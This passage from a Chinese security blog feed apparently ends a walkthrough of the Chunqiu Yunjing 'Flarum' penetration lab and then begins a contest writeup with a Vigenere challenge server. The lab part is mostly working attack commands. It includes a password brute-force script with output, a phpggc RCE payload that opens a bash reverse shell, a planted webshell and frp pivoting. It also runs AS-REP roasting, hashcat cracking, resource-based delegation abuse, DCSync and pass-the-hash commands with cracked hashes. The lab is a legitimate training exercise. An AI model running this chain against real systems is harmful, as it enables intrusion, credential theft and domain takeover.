br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.99.145.57/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-CSRF-Token&quot;</span>: <span class="string">&quot;BGMRkYNmoTorcp7Z7y0alTNUpBgAObn0ajWOCXjw&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://39.99.145.57&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;flarum_session=HP5SjfzKojWBS5DalIA3k1x4i0o0CEwZWR2o6hfc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Path to the text file containing passwords</span></span><br><span class="line">password_file = <span class="string">&quot;rockyou.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base payload structure</span></span><br><span class="line">base_payload = &#123;</span><br><span class="line">    <span class="string">&quot;identification&quot;</span>: <span class="string">&quot;administrator&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;remember&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_login</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="comment"># Update payload with the current password</span></span><br><span class="line">    payload = base_payload.copy()</span><br><span class="line">    payload[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Send POST request</span></span><br><span class="line">        response = requests.post(url, headers=headers, json=payload, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Status Code: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response: <span class="subst">&#123;response.text[:<span class="number">200</span>]&#125;</span>...&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error with password <span class="subst">&#123;password&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read passwords from file</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            passwords = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;<span class="built_in">len</span>(passwords)&#125;</span> passwords to try.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Try each password</span></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">            <span class="keyword">if</span> try_login(password):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Success! Valid password found: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No valid password found.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;password_file&#125;</span> not found.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An unexpected error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Found 14344382 passwords to try.</span></span><br><span class="line"><span class="string">Password: 1chris</span></span><br><span class="line"><span class="string">Status Code: 200</span></span><br><span class="line"><span class="string">Response: &#123;&quot;token&quot;:&quot;HMtVKZciPe3dCM549hF55R8MVPD83hMqB3dU6oCh&quot;,&quot;userId&quot;:1&#125;...</span></span><br><span class="line"><span class="string">Success! Valid password found: 1chris</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>成功进入后台，可以查到这里有RCE的漏洞，用phpggc生成一下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -p tar -b Monolog/RCE6 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/23333 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1757766396923-b8bfc8bf-44ab-4daf-a57d-2adb3ed32d5e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>管理后台-外观-自定义样式填进去</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> (inline) <span class="string">&#x27;data:text/css;base64,xxx&#x27;</span>;</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1757766551010-279a8999-cb14-4b0e-ae30-652b00198e8b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再用phar协议包含一下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.test</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: data-uri(<span class="string">&#x27;phar://./assets/forum.css&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1757766826837-031e087d-2667-4082-bc66-6da7e8738f5f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>成功弹shell</p><figure><imgsrc="/images/春秋云境-Flarum/1757766861816-ba818df9-8cc2-418e-a818-3a1180cd10e8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先写个马进去方便用蚁剑连上</p><figure><imgsrc="/images/春秋云境-Flarum/1757766998553-f55383ba-a8fa-43c5-b990-5610a48fee04.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Flarum/1757767094950-aac7a318-9a1b-4494-a0a8-de82b5b46a88.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>capabilities提权</p><figure><imgsrc="/images/春秋云境-Flarum/1757767241174-539f1aea-c509-4c3a-ba7e-42d6c8e72700.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以用openssl任意文件读</p><figure><imgsrc="/images/春秋云境-Flarum/1757767332684-5eb2edb1-5133-4bef-91e6-d12448b4ed74.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>扫内网</p><figure><imgsrc="/images/春秋云境-Flarum/1759850022406-ef0e1a6c-33df-46fe-8a3e-05f9e3c2e99a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Flarum/1759850493253-2a163549-3d67-43f7-8c03-8cbe5870708d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在数据库中找到一个账密</p><figure><imgsrc="/images/春秋云境-Flarum/1759850551941-83ff4c24-b890-47da-ba04-d86af8ebef14.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>连上数据库</p><figure><imgsrc="/images/春秋云境-Flarum/1759850694940-864d1e29-8878-454f-8445-6b25b7da1a2d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>找到了大量用户名</p><figure><imgsrc="/images/春秋云境-Flarum/1759850770766-9bfc23ea-e3b4-4409-b902-7726e492a477.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打AS-REP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.60.8  xiaorang.lab/ -usersfile users.txt</span><br></pre></td></tr></table></figure><p>成功找到了两条hash</p><figure><imgsrc="/images/春秋云境-Flarum/1759851723615-e1065fa4-3720-4586-8b35-0f52c4fb7bed.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>爆破hash，爆出了其中一个的明文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1759851919471-31cf0726-b93d-4933-9b3d-cbe9c7398292.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连上172.22.60.15，看到里面有个xshell</p><p>直接用工具提取出其中的账号密码</p><figure><imgsrc="/images/春秋云境-Flarum/1759978885474-d6221397-012c-486b-aafc-66cca92fdb17.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>收集一下域信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -c all -ns 172.22.60.8 --zip --dns-tcp</span><br></pre></td></tr></table></figure><p>zhangxin用户属于Account Operators组</p><figure><imgsrc="/images/春秋云境-Flarum/1759986254769-112c77b8-cc28-4c68-a5a3-498e02b4763b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>FILESERVER对域有GetChanges和GetChangesAll权限，因此可以DCSyncAttack</p><figure><imgsrc="/images/春秋云境-Flarum/1759986597305-20890d66-d5b0-40d2-bc97-4c02b64716ae.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打RBCD</p><p>添加机器用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-addcomputer xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name <span class="string">&#x27;HACK$&#x27;</span> -computer-pass <span class="string">&#x27;1q2w3e4r!&#x27;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760091252086-8920530c-0669-4757-b1f6-e044d6b8a484.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>配置属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-rbcd xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -action write -delegate-to <span class="string">&#x27;FILESERVER$&#x27;</span> -delegate-from <span class="string">&#x27;HACK$&#x27;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760091401834-92a58861-2385-46bf-998c-4383f1e5b0f0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>获取ST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-getST xiaorang.lab/<span class="string">&#x27;HACK$&#x27;</span>:<span class="string">&#x27;1q2w3e4r!&#x27;</span> -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760091952423-8e1ed182-8e10-4f12-82e3-2685f11a5786.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>修改/etc/hosts</p><figure><imgsrc="/images/春秋云境-Flarum/1760092122707-2dec46d9-20cb-4896-bbc5-6f1582b63374.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ptt拿flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_Fileserver.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line">proxychains4 impacket-psexec Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760091994014-daf971bb-c3c8-4259-8c0e-02528413fc8e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Flarum/1760092039040-cfac4c8f-d692-4ca8-8f64-f3b1be8cd369.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>抓一下fileserver的哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760105739397-a10147ce-a1c4-47c8-acb0-1a7eead7ebcf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用FILESERVER$机器账户进行DCSync攻击拿域控管理员哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump xiaorang.lab/<span class="string">&#x27;FILESERVER$&#x27;</span>:@172.22.60.8 -hashes <span class="string">&#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27;</span> -just-dc-user Administrator</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760105913116-5916e9be-1609-48fd-b950-465b14c66b61.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>pth拿剩下两个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.60.8 -u administrator -H c3cfdc08527ec4ab6aa3e630e79d349b -d xiaorang.lab -x <span class="string">&quot;type C:\Users\Administrator\flag\flag04.txt&quot;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760106200406-cfbe2979-cc0c-4190-be90-fe57ba31ec7a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.60.15 -u administrator -H c3cfdc08527ec4ab6aa3e630e79d349b -d xiaorang.lab -x <span class="string">&quot;type C:\Users\Administrator\flag\flag02.txt&quot;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Flarum/1760106321716-734091ac-05cd-48f7-b4c5-46bb77e7f692.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025江苏移动赋能建功网络安全技能竞赛 个人赛 Writeup</title>
      <link href="/posts/33892b4f/"/>
      <url>/posts/33892b4f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>被学校里的老师N层委派来打了这个比赛（（</p><p>好久没有这样打这种个人赛了，一个人打五个方向知识有限真的吃力（</p><p>好在很多题目还是比较基础的，也是混上了一个学生组三等奖 :)</p><p>可惜后面团体赛我们阵营输了，我们队伍没拿上奖 :(感觉还是得多练练渗透了（</p></blockquote><h2 id="crypto">Crypto</h2><h3 id="vigenere_server">vigenere_server</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- 可见 ASCII 94 字符表 ----------------</span></span><br><span class="line"><span class="comment"># 0x20–0x7E 共 94 个字符，空格到 ~</span></span><br><span class="line">ALPHABET = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7F</span>)])</span><br><span class="line">ALPHABET_SIZE = <span class="built_in">len</span>(ALPHABET)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_index</span>(<span class="params">ch: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;字符 -&gt; 在 94 字符表中的索引&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(ch) - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_char</span>(<span class="params">idx: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;索引 -&gt; 对应字符（自动循环）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>((idx % ALPHABET_SIZE) + <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- 加/解密实现 ----------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_enc</span>(<span class="params">plain: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;维吉尼亚加密（可见字符版）&quot;&quot;&quot;</span></span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(plain):</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:           <span class="comment"># 非可见字符原样保留</span></span><br><span class="line">            cipher.append(ch)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        k = key[i % <span class="built_in">len</span>(key)]            <span class="comment"># 密钥循环使用</span></span><br><span class="line">        shift = char_index(k)            <span class="comment"># 密钥字符对应的偏移量</span></span><br><span class="line">        new_idx = (char_index(ch) + shift) % ALPHABET_SIZE</span><br><span class="line">        cipher.append(index_char(new_idx))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_dec</span>(<span class="params">cipher: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;维吉尼亚解密（可见字符版）&quot;&quot;&quot;</span></span><br><span class="line">    plain = []</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:           <span class="comment"># 非可见字符原样保留</span></span><br><span class="line">            plain.append(ch)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        k = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">        shift = char_index(k)</span><br><span class="line">        new_idx = (char_index(ch) - shift) % ALPHABET_SIZE</span><br><span class="line">        plain.append(index_char(new_idx))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- 网络服务配置 ----------------</span></span><br><span class="line">KEY = <span class="string">&quot;&quot;</span>          <span class="comment"># 固定密钥</span></span><br><span class="line">GREETING_PLAIN = <span class="string">&quot;Hello,good morning!How are you?&quot;</span>  <span class="comment"># 明文问候语</span></span><br><span class="line">TRIGGER = <span class="string">&quot;I&#x27;m fine,thank you!&quot;</span>           <span class="comment"># 触发 flag 的明文</span></span><br><span class="line">FLAG_FILE = <span class="string">&quot;flag&quot;</span>                        <span class="comment"># flag 文件名（位于工作目录）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client</span>(<span class="params">conn: socket.socket, addr</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理单个客户端连接&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;addr&#125;</span> connected&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 连接后立即发送加密后的问候语</span></span><br><span class="line">        greeting_cipher = vigenere_enc(GREETING_PLAIN, KEY)</span><br><span class="line">        conn.sendall((greeting_cipher + <span class="string">&quot;\n&quot;</span>).encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 持续循环等待用户输入</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = conn.recv(<span class="number">4096</span>)               <span class="comment"># 一次最多 4096 字节</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:                         <span class="comment"># 客户端断开</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            cipher_line = data.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>).rstrip(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">            plain_line = vigenere_dec(cipher_line, KEY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 3. 判断是否触发 flag</span></span><br><span class="line">            <span class="keyword">if</span> plain_line == TRIGGER:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(FLAG_FILE, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        flag = f.read().strip()</span><br><span class="line">                <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                    flag = <span class="string">&quot;FLAG_FILE_NOT_FOUND&quot;</span></span><br><span class="line">                conn.sendall((vigenere_enc(flag, KEY) + <span class="string">&quot;\n&quot;</span>).encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                <span class="keyword">break</span>                                <span class="comment"># 发完 flag 断开</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                conn.sendall(<span class="string">f&quot;Decrypted: <span class="subst">&#123;plain_line&#125;</span>\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;addr&#125;</span> disconnected&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9999</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;启动 TCP 服务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)  <span class="comment"># 地址复用</span></span><br><span class="line">        s.bind((host, port))</span><br><span class="line">        s.listen(<span class="number">5</span>)                         <span class="comment"># 最大挂起连接数 5</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            conn, addr = s.accept()</span><br><span class="line">            <span class="comment"># 每来一个连接开新线程处理</span></span><br><span class="line">            threading.Thread(target=handle_client, args=(conn, addr), daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 启动前检查 flag 文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(FLAG_FILE):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[WARN] flag 文件不存在，请先创建&quot;</span>)</span><br><span class="line">    serve()</span><br></pre></td></tr></table></figure><p>读题，题目大致是要求先根据给出的明密文推出私钥，然后对指定明文加密发过去验证，最后再解发过来的被加密的flag</p><p>写个脚本解决，有的函数直接抄题目里的（</p><p>自己推出来的key其实有点不完整，后面蒙一下就行（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 